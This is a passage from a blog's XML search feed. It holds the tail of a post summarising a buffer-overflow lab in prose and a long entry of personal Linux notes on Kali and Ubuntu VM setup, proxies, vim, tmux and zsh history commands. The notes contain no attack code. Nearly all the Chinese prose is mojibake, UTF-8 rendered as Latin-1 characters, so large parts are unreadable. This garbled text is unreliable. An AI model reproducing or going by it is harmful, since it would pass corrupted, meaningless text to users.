çš„èµ·å§‹åœ°å€ã€‚</li><li>Level3ï¼šåŒæ—¶åˆ©ç”¨è‡ªå·±ç¼–å†™çš„ä»£ç è®¾ç½®è¿”å›å€¼å¹¶è¿”å›è‡³testå‡½æ•°ï¼Œéœ€è¦è¦†ç›–bufæ—¶è¦ä¿æŒå‡½æ•°ä¿å­˜çš„æ—§ebpä¸å˜ã€‚</li><li>Level4ï¼šæ¯æ¬¡è°ƒç”¨getbufnçš„ç›®çš„ä¸Level3ä¸€è‡´ï¼Œä¸åŒçš„æ˜¯å®ƒçš„ebpä¸æ–­å˜åŒ–ï¼Œéœ€è¦æ‰¾åˆ°ç­‰å¼å…³ç³»å»ç¼–å†™ä»£ç ä»¥ä¿®æ­£è€Œebpã€‚è€Œå¤šæ¬¡è°ƒç”¨ä½¿æ ˆåŸºå€éšæœºåŒ–ï¼Œè¿™éœ€è¦åˆ©ç”¨nop_sledçš„æŠ€æœ¯ã€‚</li></ol><p>æ€»çš„æ¥è¯´æ¯”è¾ƒåŸºç¡€, æˆ‘ç”¨çš„æ˜¯ctfçš„å·¥å…·æ¥å†™è¦è¾“å…¥çš„å­—èŠ‚åºåˆ—. å†ç»“åˆä¸€äº›å‘½ä»¤è¡Œæ“ä½œå¯ä»¥å¿«é€Ÿå®Œæˆæœ¬æ¬¡å®éªŒ.</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux relative hints</title>
    <link href="/2021-05/Now-linux%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021-05/Now-linux%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali-amp-Linuxçš„é—®é¢˜"><a href="#Kali-amp-Linuxçš„é—®é¢˜" class="headerlink" title="Kali&amp;Linuxçš„é—®é¢˜"></a>Kali&amp;Linuxçš„é—®é¢˜</h2><blockquote><p>linux<a href="https://www.runoob.com/linux/linux-command-manual.html">å‘½ä»¤</a>åœ¨è¿™</p></blockquote><ul><li>è™šæ‹Ÿæœºçš„å®‰è£…(åˆè£…äº†ä¸€é)</li><li>VMtoolsçš„å®‰è£…(ä¸ºä»€ä¹ˆç½‘ä¸Šä¼šæœ‰è¿™ä¹ˆå¤šçš„<a href="https://blog.csdn.net/love20165104027/article/details/83377758">æ–¹æ³•</a>.</li><li>ä¸­æ–‡è¾“å…¥æ³•Ibusçš„<a href="https://www.cnblogs.com/donghao0924/p/13503595.html">å®‰è£…(</a>ä¸¤è¡Œå‘½ä»¤è§£å†³çš„äº‹æƒ…æœ‰äº›æ•™ç¨‹æå¾—å‡ åè¡Œ,å°±ç¦»è°±)</li><li>vimæ’ä»¶(å½»åº•çš„å¤±è´¥) ä¸è¿‡åœ¨vimè®¾ç½®æ–‡ä»¶é‡Œè®¾ç½®äº†å‡ ä¸ª<a href="https://blog.csdn.net/lovewebeye/article/details/79960675">å¸¸ç”¨çš„</a>.</li><li>å¯†ç é—®é¢˜, rootåˆå§‹å¯†ç å¿˜è®°, rootä¸‹passwdæŒ‡ä»¤.   é»˜è®¤è´¦å·kali kali</li><li>vimåœ¨shareæ–‡ä»¶å¤¹é‡Œ</li><li>ä¸­æ–‡è¾“å…¥æ³•å‡ºç°[Invalid-UTF-8 code], æ”¹æˆåŠè§’ä¸­æ–‡å³å¯</li><li>make btestå‡ºé”™, ä¿®æ”¹Makefileä¸ºç”Ÿæˆ64ä½å¯æ‰§è¡Œæ–‡ä»¶<a href="https://blog.csdn.net/mazamu/article/details/107021054">[0]</a>.</li><li>LInuxä¸­å¯æ‰§è¡Œæ–‡ä»¶å’Œåç¼€åæ— å…³, å’Œæ–‡ä»¶çš„å±æ€§æœ‰å…³(????</li><li>bitsetæ˜¯ä¸€ä¸ªç±»æ¨¡æ¿</li><li>GDBä»¥åŠgccçš„<a href="https://zhuanlan.zhihu.com/p/74897601">ä½¿ç”¨</a>(è¯¦è§é›¶ç¢çŸ¥è¯†)</li><li>kaliå¦‚ä½•è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶: ./bomb</li><li>ä¸­æ–‡è¾“å…¥æ³•ä¸‹è¾“å…¥å‘½ä»¤:wæŒ‰ä¸‹å›è½¦vimä¼šå¡æ­», <strong>è¾“å…¥é€—å·ä¹Ÿèƒ½å¡æ­»?????</strong> </li><li>kaliè£…Chrome:ä»–æœ‰sandboxæœºåˆ¶, æ— æ³•åœ¨rootç”¨æˆ·ä¸‹è¿è¡Œ<a href="https://www.cnblogs.com/smart-zihan/p/13440084.html">[1]</a>.</li><li>kaliä½¿ç”¨vpn:  <strong>å¤±è´¥</strong>.</li><li>killå äº†ç«¯å£çš„è¿›ç¨‹<a href="https://blog.csdn.net/weixin_42108437/article/details/106072810">[0]</a>.</li><li>è™šæ‹Ÿæœºå¡æ­»æ—¶æŸ¥æ‰¾logæ–‡ä»¶é‡Œçš„pid, åœ¨ä»»åŠ¡ç®¡ç†å™¨é‡Œåœæ­¢</li><li>æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ<a href="https://www.cnblogs.com/flyingeagle/articles/9219106.html">[0]</a>.</li><li>Typoraçš„å®‰è£…<a href="https://blog.csdn.net/qq_33694648/article/details/104403618">é—®é¢˜</a>.</li><li>.taræ–‡ä»¶ç›¸å…³<a href="https://zhidao.baidu.com/question/873537413743808372.html">é—®é¢˜</a>.</li><li>rootç”¨æˆ·å®‰è£…äº†vmtool, åˆ‡æ¢åˆ°lbjyyeåéœ€è¦é‡æ–°å®‰è£…(?)</li><li>ä¿®æ”¹å‘½ä»¤è¡Œç»ˆç«¯å­—ä½“å¤§å°: ~/.config/qterminal.org/qterminal.ini é‡Œçš„fontsizeæˆ–fontfamilyå¹¶å°†å…¶æ”¹ä¸ºåªè¯»æ–‡ä»¶(<strong>æ–°ç‰ˆå®Œå…¨æ²¡è¿™ä¸ªé—®é¢˜</strong>)</li><li>è¦æ˜¾ç¤ºéšè—æ–‡ä»¶å¤¹ç›´æ¥åˆ°å·¥å…·æ ä¸Šçš„è§†å›¾é‡Œå»æ‰¾</li><li><a href="https://blog.csdn.net/Cappuccino_jay/article/details/105474581">å»¶é•¿</a>é”å±æ—¶é—´</li><li>chormeé‡Œ<a href="https://jingyan.baidu.com/article/75ab0bcb8547fed6864db2f8.html">æ·»åŠ </a>æœç´¢å¼•æ“</li><li>vimæ— æ³•æ‰“å¼€æ–‡ä»¶, <a href="https://blog.csdn.net/qq_38238114/article/details/78524043">æ”¹ä¸º</a>ä¸‹è½½GVIM</li><li>å•¥ç©æ„å„¿å•Š, kali2021å¹²å—ææ²¡äº†å›¾å½¢ç•Œé¢clashå¼„åŠå¤©ä¹Ÿæ²¡æˆ<a href="https://dcrelay.me/#/knowledge">[0]</a></li><li>mainå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°: ä¸€ä¸ªæ˜¯å‘½ä»¤å‚æ•°çš„ä¸ªæ•°, å¦ä¸€ä¸ªæ˜¯å‘½ä»¤å‚æ•°æ•°ç»„,argv[0]æ˜¯ç¨‹åºæœ¬èº«çš„æ–‡ä»¶å</li><li>**Typoraé‡Œä½¿ç”¨ä¸­æ–‡çŠ¶æ€ä¸‹çš„Ctrl+A, æ–‡ä»¶ç›´æ¥ä¸¢å¤±!!!!**å¤ªç‰¹ä¹ˆè ¢äº†.</li><li>/usr/share/vim/vim82/colors/æœ‰vimçš„ä¸»é¢˜<ul><li>industry å…¨é»‘,  evening è¿˜è¡Œ, koel è¶…çº§é»‘çš„èƒŒæ™¯, morning ç°ç™½å¾ˆä¸é”™, murpyåˆæ˜¯é»‘çš„å­—ä½“ç»†ç‚¹,  peachpuff æ¡ƒè‰²èƒŒæ™¯, shine äº®çç‹—çœ¼ é¢œè‰²å¤ªæµ…, slate å­—ä½“å¤ªç´§, zellner å¹³å¹³æ— å¥‡çš„ç™½åº•, å‰©ä¸‹çš„ä¸ç”¨è€ƒè™‘</li></ul></li><li>äº†è§£äº†é“¾æ¥å¼•ç”¨å’Œè„šæ³¨æ˜¯ä¸ª<a href="https://www.cnblogs.com/hnrainll/p/3514637.html">å•¥</a>.</li><li>Operation inconsistent with current stateã€‚VMæŠ¥é”™, åªè¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå°±å¯ä»¥äº†</li><li>Linuxä¸­çš„Chromeæ— æ³•è‡ªåŠ¨å‡çº§,å¹²è„†å°±ä¸å‡çº§äº†, å‘½ä»¤åŠ ä¸€ä¸ª<code>--disable-background-networking</code> </li><li>kaliä¸­ä½¿ç”¨ä¸­æ–‡è¾“å…¥æ³•çš„æ—¶å€™æ— æ³•åœ¨vscodeä¸­ç”¨å…‰æ ‡é€‰ä¸­æ–‡æœ¬</li><li>KaliæˆåŠŸç™»ä¸Šgoogle, ä½¿ç”¨chromeçš„ä»£ç†å°±æˆ. ç®—æ˜¯ææ˜ç™½ä¸€ç‚¹ä»£ç†æ˜¯æ€ä¹ˆå›äº‹äº†, Kaliæ²¡æœ‰å…¨å±€ä»£ç†åªèƒ½å†éœ€è¦çš„è½¯ä»¶é‡Œé¢è®¾ç½®ä»£ç†, å‘½ä»¤è¡Œç¨‹åºè¦ç”¨ä»£ç†è¦è£…proxytrain<ul><li>proxychains<a href="https://oopsdc.com/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">ä½¿ç”¨æ–¹æ³•</a>, å…¶ä¸­æœ¬æœºipåœ°å€ä¸º<code>æ— çº¿å±€åŸŸç½‘é€‚é…å™¨ WLAN:</code> ipv4é‚£ä¸€æ çš„åœ°å€</li><li>ç»ˆäºå•Š, kaliå’Œubuntuéƒ½èƒ½èµ°ä»£ç†äº†:sob: </li><li>è¿‡äº†ä¸€å¤©å¥½åƒåˆä¸è¡Œäº†, æ¢æˆ<code>127.0.0.1 7891</code>åæ¢äº†ä¸ªæ–°ç‰ˆæœ¬æ‰è¡Œ. <a href="http://www.bubuko.com/infodetail-3531993.html">link</a> </li></ul></li><li>éæ­£å¸¸å…³æœºåè¦å¯åŠ¨è™šæ‹Ÿæœºåªè¦åˆ é™¤<code> .lck</code>ç£ç›˜é”æ–‡ä»¶å¤¹å³å¯.</li><li>æŠŠkaliçš„zshè®¾ç½®(åŠŸèƒ½çœŸçš„æ˜¯ç›¸å½“å…¨)ç›´æ¥å¼„åˆ°pwn.collegeä¸Šé¢, æ•´ä¸ªç•Œé¢å°±å¥½çœ‹å¤šäº†.</li><li><a href="https://linuxhint.com/bash_wildcard_tutorial/">bash_wildcard</a>!</li><li>start with <a href="https://miloserdov.org/?p=3343">cli in Kali</a> :<br><code>systemctl</code> <code>set-default multi-user.target</code> <code>start display-manager.service</code> <code>set-default graphical.target</code></li><li>åƒseccomp ltraceçš„è·¯å¾„å¿…é¡»æ˜¯ç›¸å¯¹è·¯å¾„, å¦‚æœåªå†™ä¸ªæ–‡ä»¶åæ˜¯ä¸è¡Œçš„.</li><li><a href="https://www.shellscript.sh/test.html">shell scriping tutorial</a> </li><li>ä¸ºäº†shelltoolsåˆè£…äº†ä¸€ä¸ªapt install gcc-i686-linux-gnu, ä¸çŸ¥é“æœ‰æ²¡ç”¨.</li><li>zsh_hist:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash">s/^\s*\d\+.\=\s\+//g <span class="hljs-comment">#trim `history -i 0` lineno in vim</span></span><br>history -i -n 0 #print all history in timeformat<br>awk &#x27;match($0,/: ([[:digit:]]+):/, a) &#123;if(a[1]&gt;1658275200) print $0;&#125;&#x27; .zsh_history &gt; /mnt/hgfs/LearingList/configFile/zsh_hist_new #add new history<br>awk &#x27;match($0,/: ([[:digit:]]+):/, a) &#123;if(a[1]&gt;$1) print $0;&#125;&#x27; .zsh_history &gt; /mnt/LearingList/configFile/zsh_hist/$(date +&quot;%y%m%d&quot;)#in script<br><span class="hljs-meta">#</span><span class="bash">remove duplicate</span><br>cat .zsh_history | sort -k2.14 -u | sort -k2 &gt; .zsh_history.tmp<br><span class="hljs-meta">#</span><span class="bash">or <span class="hljs-keyword">in</span> one line.</span><br>cd;sort -k2.14 -u .zsh_history | sort -k2 &gt; .zsh_history.tmp;mv .zsh_history.tmp .zsh_history;cd $OLDPWD<br></code></pre></div></td></tr></table></figure><ul><li><p>ä½¿ç”¨ssh pubkeyè¿æ¥åˆ°è™šæ‹Ÿæœºä¸­æ—¶é‡åˆ°é—®é¢˜, æ€»æ˜¯æ˜¾ç¤º<code>permission denied</code>, æœäº†ä¸¤ä¸‰ä¸ªå°æ—¶æ— æœåç»ˆäºå‘ç°åœ¨kalié‡Œé¢æŸ¥çœ‹authæ—¥å¿—<code>tail -f /var/log/auth.log</code>å¯ä»¥çœ‹åˆ°æ˜¯/rootæ–‡ä»¶å¤¹çš„grouping writeæƒé™å¯¼è‡´ssh serveræ‹’ç»è¿æ¥. ç›´æ¥ä¸€ä¸ª<code>chmod 700 /root</code>è§£å†³é—®é¢˜. </p></li><li><p>vscodeå¯ä»¥ä½¿ç”¨<code>move terminal to editor area</code>å‘½ä»¤, å«ä¹‰å°±æ˜¯å­—é¢æ„æ€.</p></li><li></li></ul><h2 id="vimè¿›é˜¶"><a href="#vimè¿›é˜¶" class="headerlink" title="vimè¿›é˜¶"></a>vimè¿›é˜¶</h2><ul><li>è‡ªåŠ¨æç¤ºï¼š <code>&lt;C-n&gt;</code> å’Œ <code>&lt;C-p&gt;</code> </li><li>vim<a href="https://blog.easwy.com/archives/advanced-vim-skills-auto-complete/">è·¯å¾„è¡¥å…¨</a> </li><li>vimæ·»åŠ tabåˆ‡æ¢å¿«æ·é”®, ä»¥åŠå•ç•Œé¢å¤šæ–‡ä»¶<a href="https://linuxhint.com/opening_switching_multiple_files_vim/">æ“ä½œ</a>.<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-meta">:map ^[OR :tabp&lt;CR&gt;</span><br><span class="hljs-meta">:map ^[OS :tabn&lt;CR&gt;</span><br></code></pre></div></td></tr></table></figure></li><li>æŠ˜å :  <strong>zM</strong>: close all            <strong>zr</strong>: open all      <strong>za</strong>: openOrClose   <strong>zA</strong>: sameBut<strong>Recursively</strong> </li><li>é¢œè‰²<a href="https://alvinalexander.com/linux/vi-vim-editor-color-scheme-syntax/">option</a> </li><li><code>autocmd BufNewFile,BufRead gdb* set filetype=gdb</code> è®¾ç½®é»˜è®¤çš„è¯­æ³•é«˜äº®.</li><li><a href="https://vimhelp.org/cmdline.txt.html#%5Brange%5D">vim range</a> and <a href="https://vimhelp.org/usr_10.txt.html#10.3">this</a> </li><li>vimå…ˆè¾“å…¥æ•°å­—ç„¶åè¿›å…¥æ’å…¥æ¨¡å¼åè¾“å…¥å‡ ä¸ªå­—ç¬¦, å†è¿”å›æ™®é€šæ¨¡å¼ä¼šé‡å¤è¾“å…¥</li><li>:e =&gt; reload file</li><li>vim plug list -&gt; <a href="https://vimawesome.com/">link</a> | è£…ä¸Šäº†tabcompletion. + python completion </li><li><code>gt gTÂ nnngt</code>: switch tabs.</li><li>Ctrl-O: enter <code>insert select</code> mode, can exec one command then.</li><li><a href="https://vimhelp.org/motion.txt.html#CTRL-M">motions(many details)</a> | </li><li><code>; </code>  :  Repeat latest f, t, F or T [count] times.</li><li><code>echo &amp;var</code> will print out the variable value.<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;dl&quot;</span>    <span class="hljs-function"><span class="hljs-keyword">delete</span> <span class="hljs-title">character</span> <span class="hljs-params">(alias: <span class="hljs-string">&quot;x&quot;</span>)</span>           dl</span><br><span class="hljs-function">&quot;diw&quot;   <span class="hljs-keyword">delete</span> inner word                       diw</span><br><span class="hljs-function">&quot;daw&quot;   <span class="hljs-keyword">delete</span> a word                           daw</span><br><span class="hljs-function">&quot;diW&quot;   <span class="hljs-keyword">delete</span> inner <span class="hljs-title">WORD</span> <span class="hljs-params">(see WORD)</span>          diW</span><br><span class="hljs-function">&quot;daW&quot;   <span class="hljs-keyword">delete</span> a <span class="hljs-title">WORD</span> <span class="hljs-params">(see WORD)</span>              daW</span><br><span class="hljs-function">&quot;dgn&quot;   <span class="hljs-keyword">delete</span> the next search pattern match    dgn</span><br><span class="hljs-function">&quot;dd&quot;    <span class="hljs-keyword">delete</span> one line                         dd</span><br><span class="hljs-function">&quot;dis&quot;   <span class="hljs-keyword">delete</span> inner sentence                   dis</span><br><span class="hljs-function">&quot;das&quot;   <span class="hljs-keyword">delete</span> a sentence                       das</span><br><span class="hljs-function">&quot;dib&quot;   <span class="hljs-keyword">delete</span> inner &#x27;<span class="hljs-params">(<span class="hljs-string">&#x27; &#x27;</span>)</span>&#x27; block              dib</span><br><span class="hljs-function">&quot;dab&quot;   <span class="hljs-keyword">delete</span> a &#x27;<span class="hljs-params">(<span class="hljs-string">&#x27; &#x27;</span>)</span>&#x27; block                  dab</span><br><span class="hljs-function">&quot;dip&quot;   <span class="hljs-keyword">delete</span> inner paragraph                  dip</span><br><span class="hljs-function">&quot;dap&quot;   <span class="hljs-keyword">delete</span> a paragraph                      dap</span><br><span class="hljs-function">&quot;diB&quot;   <span class="hljs-keyword">delete</span> inner &#x27;</span>&#123;<span class="hljs-string">&#x27; &#x27;</span>&#125;<span class="hljs-string">&#x27; block              diB</span><br><span class="hljs-string">&quot;daB&quot;   delete a &#x27;</span>&#123;<span class="hljs-string">&#x27; &#x27;</span>&#125;<span class="hljs-string">&#x27; block                  daB</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">gUU  : Make current line uppercase.<br>guu :                   lowercase.<br>gU&#123;motion&#125; <span class="hljs-keyword">and</span> gu&#123;motion&#125;    Make &#123;motion&#125; text uppercase.<br><br>&#123;Visual&#125;CTRL-A <span class="hljs-comment"># INC</span><br>&#123;Visual&#125;g CTRL-A <span class="hljs-comment"># sequencial add</span><br><span class="hljs-built_in">set</span> nrformats=<span class="hljs-built_in">bin</span>,<span class="hljs-built_in">hex</span> <span class="hljs-comment"># this is default. can include `octal` `alpha`</span><br>Use the following<br><br>steps to make a numbered <span class="hljs-built_in">list</span>.<br><span class="hljs-number">1.</span> Create the first list_entry, make sure it starts <span class="hljs-keyword">with</span> a number.<br><span class="hljs-number">2.</span> qa        - start recording into register <span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-number">3.</span> Y         - yank the entry<br><span class="hljs-number">4.</span> p         - put a copy of the entry below the first one<br><span class="hljs-number">5.</span> CTRL-A    - increment the number<br><span class="hljs-number">6.</span> q         - stop recording<br><span class="hljs-number">7.</span> &lt;count&gt;@a - repeat the yank, put <span class="hljs-keyword">and</span> increment &lt;count&gt; times<br></code></pre></div></td></tr></table></figure></li><li><a href="https://vimhelp.org/change.txt.html#complex-change">complex changes</a> : toooooo complex.</li><li><a href="https://vimhelp.org/pattern.txt.html#pattern-overview">regex pattern</a> | and an useful <a href="http://vimregex.com/">post</a> </li><li><strong>qaè®°å½•åˆ°aä¸­, @aæ‰§è¡Œå®, num@aæ‰§è¡Œnumæ¬¡, @@æ‰§è¡Œä¸Šä¸€ä¸ªå®</strong>.</li><li><a href="https://vimhelp.org/motion.txt.html#various-motions">variable motion</a>, æ¯”å¦‚è¯´è·³åˆ°ä¸‹ä¸€ä¸ªmethodæˆ–è€…#if. </li></ul><h2 id="tmux-gdb"><a href="#tmux-gdb" class="headerlink" title="tmux+gdb"></a>tmux+gdb</h2><ul><li><a href="https://github.com/tmux/tmux">tmux</a>  <a href="https://github.com/tuxotron/voltron-tmux">tmux-voltron</a>  <a href="https://github.com/tmuxinator/tmuxinator">tmuxinator</a>  <a href="https://github.com/snare/voltron">voltron</a> è¿™æ–¹æ³•å¯èƒ½æ²¡å•¥ç”¨.</li><li>ä½¿ç”¨pwndbgçš„split: <a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#splitting--layouting-context">features</a> | <a href="https://github.com/jerdna-regeiz/splitmind">split mind</a> </li><li><a href="https://www.hamvocke.com/blog/a-guide-to-customizing-your-tmux-conf/">tmux config</a> | cheat <a href="https://tmuxcheatsheet.com/">sheet</a> | <a href="https://pragprog.com/titles/bhtmux2/tmux-2/">tutorial</a> </li><li>åŠ è½½configæ–‡ä»¶å¤±è´¥: <code>tmux kill-server</code> or reload</li><li><code>for i in &#123;0..255&#125;; do  printf &quot;\x1b[38;5;$&#123;i&#125;mcolor%-5i\x1b[0m&quot; $i ; if ! (( ($i + 1 ) % 8 )); then echo ; fi ; done</code>æ‰¾åˆ°æ‰€æœ‰çš„é¢œè‰².</li><li><code>&lt;prefix&gt; !</code>æˆ–è€…<code>:join-pane -t &lt;int&gt;</code>å¯ä»¥å°†ä¸€ä¸ªspaneç§»è¿›æˆ–ç§»å‡º.</li><li>Ctrl+b, <code>.</code>, <code>222</code> (renumber) | Ctrl+A+q = windows number | </li></ul><h2 id="ubuntu2004"><a href="#ubuntu2004" class="headerlink" title="ubuntu2004"></a>ubuntu2004</h2><ul><li>ubuntuè™½ç„¶ä»»åŠ¡æ ä¸å¥½ç”¨, ä½†æ˜¯æœ‰å¿«æ·é”®æŒºèˆ’æœçš„, ç»§ç»­è®°!</li><li>ubuntu sudoå‘½ä»¤å»¶æ—¶å¾ˆé•¿<a href="https://blog.csdn.net/kiritow/article/details/80687036">è§£å†³åŠæ³•</a> </li><li>æ›´æ–°<a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">ubuntuæº</a> </li><li>linuxç»ˆç«¯<a href="http://www.360doc.com/content/16/0615/15/7044580_567984505.shtml">å¿«æ·é”®</a> </li><li>é€šè¿‡å¢åŠ å¿«æ·é”®ç»‘å®šè§£å†³vimç»ˆç«¯ä¸­æ— æ³•ä½¿ç”¨æ–¹å‘é”®çš„é—®é¢˜</li><li>init 0é‡å¯å‘ç°æŒ‚è½½å¤±è´¥äº†, ä¹‹å‰é‚£ä¸ªå‘½ä»¤ä¹Ÿä¸ç®¡ç”¨äº†, åªèƒ½å€’å›ä¸Šä¸€ä¸ªå¿«ç…§ç»§ç»­, è¿˜å¥½åšå®¢éƒ½æ˜¯ç”¨çš„å…±äº«æ–‡ä»¶å¤¹.<br>ä¸è¯´äº†, å¿«ç…§å†æ¬¡æ•‘æˆ‘ä¸€å‘½.<ul><li>æ‰¾åˆ°äº†è§£å†³åŠæ³•, è¦ç»™æ™®é€šç”¨æˆ·æƒé™è®¿é—®</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot; &quot; | sudo -S vmhgfs-fuse -o allow_other ......<br></code></pre></div></td></tr></table></figure><ul><li><p>colorizing man pages: <a href="https://askubuntu.com/questions/156383/how-to-have-colored-manual-pages-in-gnome-terminal/834107#834107">link</a> &amp;&amp; <a href="https://seamatinee.com/2021/09/23/ubuntu-customization/#Terminal-%E7%BE%8E%E5%8C%96">zsh</a> </p></li><li><p>save zsh history and multiterminal-hisory-share <a href="https://blog.lilydjwg.me/2013/7/3/manually-save-read-zsh-history-entries.39852.html">link</a> </p></li><li><p>zsh-autosuggestions: kalié»˜è®¤è£…ä¸Šè€Œubuntuæ²¡æœ‰çš„(ä»–æœ‰ä¸ªå•¥??)è‡ªåŠ¨å†å²å‘½ä»¤å»ºè®®.<br>ä½¿ç”¨<code>sudo apt install zsh-autosuggestions</code>å³å¯è£…ä¸Š. </p></li><li><p>é€šè¿‡ä¿®æ”¹/etc/passwdæ–‡ä»¶æ¥ä½¿å¾—rootç”¨æˆ·çš„homeæ¢åˆ°<code>/home/lbjyye</code>, å…ˆå°è¯•ä¸€æ®µæ—¶é—´, çœŸçš„ä¸æƒ³æ‰“sudo, kali rootç”¨ä¹ æƒ¯äº†</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">chmod -R 755 /home/lbjyye/.local/share/zinit<br>chown -R root:root /home/lbjyye/.local/share/zinit<br></code></pre></div></td></tr></table></figure></li><li><p>docker-desktopçš„æ—§contextæ•´çš„æˆ‘åŠå¤©ç”¨ä¸äº†â€¦â€¦</p></li><li><p>å‘ç°ä»£ç†å¤±æ•ˆäº†, è¯•äº†åŠå¤©ç»“æœåˆ é™¤äº†è®¾ç½®ä¸­çš„FTPä»£ç†åœ°å€å°±æˆåŠŸäº†. ä¸ç„¶ä¹‹å‰è¿googleéƒ½ä¸Šä¸å». ç„å­¦é—®é¢˜, æ—¢ç„¶è§£å†³äº†å°±ä¸ç®¡äº†. </p></li></ul><h2 id="ubuntu2204"><a href="#ubuntu2204" class="headerlink" title="ubuntu2204"></a>ubuntu2204</h2><ul><li><a href="https://linuxconfig.org/how-to-allow-gui-root-login-on-ubuntu-22-04-jammy-jellyfish-linux">enable root account in ubuntu</a> </li><li>ç»“æœchromeæ˜¾ç¤ºå‡ºé—®é¢˜äº†(æ¢æˆäº†æµ‹è¯•ç‰ˆ), firefoxçš„åŒæ­¥åˆè ¢å¾—ä¸€b, çœŸæ˜¯å—ä¸äº†äº†.</li><li></li></ul><h2 id="å„ç§å‘½ä»¤-è½¯ä»¶åŒ…"><a href="#å„ç§å‘½ä»¤-è½¯ä»¶åŒ…" class="headerlink" title="å„ç§å‘½ä»¤+è½¯ä»¶åŒ…"></a>å„ç§å‘½ä»¤+è½¯ä»¶åŒ…</h2><ul><li><em>ldd</em>  <em>strace(åˆšåˆšè£…çš„)</em> <em>headæ‰“å°å‰nè¡Œ</em>  <em>duæ˜¾ç¤ºæ–‡ä»¶å¤§å°</em>   <em>psæ‰“å°è¿›ç¨‹ä¿¡æ¯</em>  <ul><li>ldd: print shared object dependencies</li><li>ps aux  â€“  BSDå‚æ•°é£æ ¼</li></ul></li><li>Linuxä¸‹<code>!</code>çš„<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">ç”¨æ³•</a>, ä¸»è¦æ˜¯ä¼ é€’æœ€åæ‰§è¡Œçš„å‘½ä»¤çš„å‚æ•°ï¼Œä»¥æ–¹ä¾¿çš„è¿è¡Œæ–°å‘½ä»¤(éå¸¸å®ç”¨)</li><li><a href="http://c.biancheng.net/linux/ln.html">lnå‘½ä»¤|symbolic_link</a> </li><li>scp &amp; mkdir &amp; mv(linuxä¸­é‡å‘½åçš„å”¯ä¸€æ–¹æ³•)</li><li><em><strong>screen</strong></em>: window manager, å¥½å¤šå¿«æ·é”®, å¤åˆ¶äº†ä¸€ä»½<a href="https://gist.github.com/joaopizani/2718397">.screenrc</a>, è¿˜æŒºæœ‰è¶£çš„.<ul><li>screenè¿™ç©æ„å„¿ä¹Ÿå¤ªå¼ºäº†.<code>Ctrl + A + [</code>è¿›å…¥copyæ¨¡å¼æ‰èƒ½ä½¿ç”¨æ»šè½®æˆ–è€…Ctrl+F/Bç­‰ç­‰æ¥ç¿»é¡µ(å·²ç»æ”¹æˆ&lt;C-/&gt;)</li></ul></li><li><del>çœ‹åˆ°ä¸€ä¸ªcscopeåŒ…å¯ä»¥ç”¨æ¥è§£æC/C++é¡¹ç›®, æœ‰ç©ºå†ç ”ç©¶æ€ä¹ˆç©</del>(è°ç©å•Š2</li><li>vim-gtkæ˜¯vimçš„ä¸€ä¸ªGUIç‰ˆæœ¬, è£…äº†ä¹‹åæ‰èƒ½vim -g</li><li>æ–°å‘½ä»¤: <code>tput</code>å¥½åƒæ˜¯ç”¨ä¸€ä¸ªé€šç”¨å‘½ä»¤åšå‚æ•°,  ç„¶ååœ¨å½“å‰ç»ˆç«¯çš„æ•°æ®åº“ä¸­æ‰¾åˆ°æ­£ç¡®çš„å‘½ä»¤å¹¶å‘é€</li><li><strong>ipython: System shell with !</strong> interactive Pythonä¹ŸæŒºç¥å¥‡çš„, å…·ä½“è§pwn-modulesé‡Œçš„å¸®åŠ©.<ul><li><a href="https://blog.51cto.com/essun/1712322">ipythonç”¨æ³•</a> </li></ul></li><li>å‘ç°grepæœ‰æ‹“å±•æ­£åˆ™å’Œæ™®é€šæ­£åˆ™çš„åŒºåˆ«, åˆæ˜¯ä¸€å¤§å †ä¸œè¥¿, 